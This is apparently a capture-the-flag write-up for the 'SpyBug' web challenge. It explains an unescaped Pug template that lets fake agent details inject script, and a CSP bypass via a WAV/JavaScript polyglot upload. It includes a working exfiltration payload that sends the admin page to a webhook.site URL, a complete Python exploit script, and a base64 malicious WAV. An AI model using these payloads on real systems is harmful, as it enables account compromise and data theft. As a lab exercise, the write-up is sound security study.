# SpyBug :: Medium

## Scenario

```
As Pandora made her way through the ancient tombs, she received a message from her contact in the Intergalactic Ministry of Spies.
They had intercepted a communication from a rival treasure hunter who was working for the alien species.
The message contained information about a digital portal that leads to a software used for intercepting audio from the Ministry's communication channels.
Can you hack into the portal and take down the aliens counter-spying operation?
```

## Solve

![](/images/spybug-source-tree.png)

This is a polyglot and XSS challenge.    
It is s very nice one.    

### Analyzing the bug.

The premise is that there is a go program called `spybug-agent.go`.      
This program is like an implant, put on a compromised machine to spy on its user.  
It records the sound every 30 seconds and generates a `.wav` file.  

```go

func main() {
	const configPath string = "/tmp/spybug.conf"
	const audioPath string = "rec.wav"
	const apiURL string = "http://127.0.0.1:1337"


	var apiConnection bool = checkConnection(apiURL)

	if apiConnection {
		var configFileExists bool = checkFile(configPath)
		if configFileExists {
			var credidentials []string = readFromConfigFile(configPath)
			var credsValidated = checkAgent(apiURL, credidentials[0], credidentials[1])
			if credsValidated {
				updateDetails(apiURL, credidentials[0], credidentials[1])
				for range time.NewTicker(30 * time.Second).C {
					recordingRoutine(apiURL, credidentials[0], credidentials[1], audioPath)
				}
			} else {
				var newCredidentials []string = registerAgent(apiURL)
				writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
				main()
			}
		} else {
			var newCredidentials []string = registerAgent(apiURL)
			writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
			main()
		}
	} else {
		time.Sleep(30 * time.Second)
		main()
	}
}}
```

We can see that the bug initiates a `Ticker` object, executing the `recordingRoutine` function every 30 seconds.  

After the recording is done, it then sends it to a server.  
On which an administrator can listen to these recordings.  

### Analyzing the backend.
Here is the login form for the backend:  

![](/images/spybug-login.png)

We do not have credentials to log in, but we have the source code, for the portal.  
I locally changed it to `admin:admin`, to test my exploits.  

This is what the admin panel looks like:  
![](/images/spybug-dashboard.png)

While analyzing the code, it was found that the application reflects the information about agents without sanitizing them.  

We can see it in the `panel.pug` view template.  
```pug
doctype html
head
	title Spybug | Panel
	include head.pug
body

	 // snip //
	table.w-100
		thead
			tr
			th ID
			th Hostname
			th Platform
			th Arch
		tbody
			each agent in agents
				tr
					td= agent.identifier
					td !{agent.hostname}
					td !{agent.platform}
					td !{agent.arch}
		else
			h2 No agents
```

The information `agent.hostname`, `agent.platform` and `agent.arch` is reflected and not sanitized by the application.  
We can confirm this by looking at how the variables are included in the template.  
In pug, the `!{}` expression [disables sanitization](https://pugjs.org/language/interpolation.html#string-interpolation-unescaped).  

This is a vector for a reflected XSS attack.    
There are limiting factors, the application uses the following CSP:    

```js
script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';
```

This means that the browser will only execute scripts if they are served from the domain itself.  

Anything else will be blocked by the CSP, even if the application is vulnerable to XSS.  

We need to place a file on the server running the application, and have that file accessible to inlude as a `src` to our XSS.  

### Crafting a payload.

**The `spybug` uploads recordings.**  

These files have to be listened to by the administrator, so they have to be accessible to download.  

Going by this logic, we can craft a `.wav` file that acts as a valid audio file and contains a valid Javascript payload.  
This is known as a [Polyglot](https://en.wikipedia.org/wiki/Polyglot_(computing)).  
It means that our file is valid for both targeted formats, `.wav` and `.js`.  

After some testing locally, the final `.wav` file is the following:  
```javascript
RIFF/*WAVEfmt*/="";fetch("https://webhook.site/11a96b58-3fb0-49b3-a475-e1913d3d2cd8/?body="+btoa(encodeURIComponent(document.body.innerHTML)), {mode: "no-cors",});
```

This payload will send the content of the admin panel to our webhook instance, giving us the flag.  

The `mode: no-cors` is important for this to work, otherwise the `cors` will block the request.(the bot uses headless chromium)  


### Uploading our payload.
  
Now we need to upload our file.  

Proxying the requests sent by our `spybug` through Burp would be a good start.  
We can set the `HTTP_PROXY` environment variable to point to our proxy.    
The `spybug-agent.go` program will then automatically send them to our proxy.  

This will let us block the requests and modify them to craft our exploit.  

```bash
HTTP_PROXY="http://localhost:8080" go run spybug-agent.go
```

Let's look at what the agent does when launched.  

When it boots, the agent makes a few requests to the backend.  
It begins by a few `GET` requests to `/` and `/panel/login`.  

This confirms to the agent that it is its backend.  

Then the agent calls `/agents/register`, which returns a `token` and an `identifier`.  

These are then used by the agent to perform actions, like update its information and upload the recordings.  

Here is the registration:  

Request:
```http
GET /agents/register HTTP/1.1
Host: 10.18.232.1:1337
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip, deflate
Connection: close

```

Response:
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/json; charset=utf-8
Content-Length: 100
ETag: W/"64-N1h6DPP48i/ZNULIywKCw6AAAIM"
Set-Cookie: connect.sid=s%3AS75hvX2G--EVmprOrmD-mwPybdGCJAPl.bbOwUEAELe48y%2BdsTqaiggRtVzO8zq58wCmMuBiTR4Q; Path=/; HttpOnly
Date: Thu, 23 Mar 2023 21:42:05 GMT
Connection: close

{"identifier":"0544d79d-e9d9-47de-8423-ee0c30a0226c","token":"37994ce1-f9b9-4c72-8b28-b18b7848fae0"}
```

Using these values, the agent now confirms that it is correctly registered, by calling the `/agents/checks/<id>/<token>` api.  

![](/images/spybug-agent-checks.png)

Once it is correctly registered, it sends details about the compromised machine.  
In our case it is a kali linux container.  

![](/images/spybug-agent-details.png)

The server does not validate this information and there is no filtering done on the provided values.  

Finally, the agent start uploading recordings.  
  
I intercepted this request in order to understand it.  

```http
POST /agents/upload/289cdbc9-db27-4cd7-b514-8ea45f0e78f4/f169be48-7092-4e27-a57f-0b4219ffdc67 HTTP/1.1
Host: 10.18.232.1:1337
User-Agent: Go-http-client/1.1
Content-Length: 1464982
Content-Type: multipart/form-data; boundary=27107fc38be92d2a4dd133a91889dfd64f37c0c193719b5afa3252b5881c
Accept-Encoding: gzip, deflate
Connection: close

--27107fc38be92d2a4dd133a91889dfd64f37c0c193719b5afa3252b5881c
Content-Disposition: form-data; name="recording"; filename="rec.wav"
Content-Type: application/octet-stream

RIFF/*WAVEfmt    Duran  ICMT,     https://www.youtube.com/watch?v=xvFZjo5PgG0 ICRD	 20200728  INAM$   Rick Roll (Different link + no ads) ISFT    Lavf58.76.100 data*/="";alert(0);/*
//snip -- this is .wav data//

--27107fc38be92d2a4dd133a91889dfd64f37c0c193719b5afa3252b5881c--

```

There is a hint in the `rec.wav` file provided by the organizers.  
They rickrolled us, then gave us a hint by including an XSS payload.  

The agent's request returned a 500 in the beginning, because it does not correctly set the `Content-Type` to `audio/wave`.  

It always returns a `400 Bad Request` response.   

Fixing this allows us to upload the file.  

Now we need to cause the XSS on the admin panel.  

To do so, we can specify the agent information as this payload: 

```html
<script src="<url-to-uploaded-wav-file>"></script>
```

This will cause our payload in the `.wav` file to be executed in the context of the administrator as he browses the admin panel.  
Which will send the flag to us !  

![](/images/spybug-admin-page-encoded.png)

![](/images/spybug-admin-page-decoded.png)

## Script

```python
#!/usr/bin/env python3

import sys
import requests

TARGET = "http://localhost:1337"
REGISTER_ENDPOINT = "/agents/register"
UPLOAD_ENDPOINT = "/agents/upload/{}/{}"
SEND_INFO_ENDPOINT = "/agents/details/{}/{}"
XSS_PAYLOAD = "<script src=\"/uploads/{}\"></script>"


if __name__ == "__main__":
    print("[*] Registering ..")
    s = requests.Session()
    agent = s.get(TARGET + REGISTER_ENDPOINT).json()
    token = agent['token']
    agent_id = agent['identifier']
    print(agent)

    print('[*] UPLOAD ...')
    upload_id = s.post(
            TARGET + UPLOAD_ENDPOINT.format(agent_id, token),
            files={"recording": ("mal.wav", open('mal.wav', 'rb'), "audio/wave")}
            ).text
    print(upload_id)

    print("[*] Sending malicious information")
    payload = XSS_PAYLOAD.format(upload_id)
    info = {"arch": "0wn3d :: - :)",
            "hostname": ":')",
            "platform": payload}
    r = s.post(
            TARGET + SEND_INFO_ENDPOINT.format(agent['identifier'], agent['token']),
            json=info)
    print(r.text)

    print("[*] Check webhook.site.")
```

base64 encoded `mal.wav` file:  
```
UklGRi8qFgBXQVZFZm10Ki89IiI7ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzExYTk2YjU4LTNmYjAtNDliMy1hNDc1LWUxOTEzZDNkMmNkOC8/Ym9keT0iK2J0b2EoZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKSksIHttb2RlOiAibm8tY29ycyIsfSk7DQo=
```

